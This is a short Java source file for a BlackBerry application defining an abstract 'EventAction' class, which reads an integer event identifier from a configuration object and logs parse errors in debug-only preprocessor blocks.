//#preprocess
package blackberry.action;

import blackberry.config.ConfAction;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

abstract class EventAction extends SubAction {
    //#ifdef DEBUG
    private static Debug debug = new Debug("EventAction", DebugLevel.VERBOSE);
    //#endif
    
    protected int eventId;

    public EventAction(ConfAction params) {
        super(params);
    }

    protected boolean parse(ConfAction params) {
        try {            
            this.eventId = params.getInt("event");

        } catch (ConfigurationException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("parse");
            //#endif
            return false;
        }

        return true;
    }

}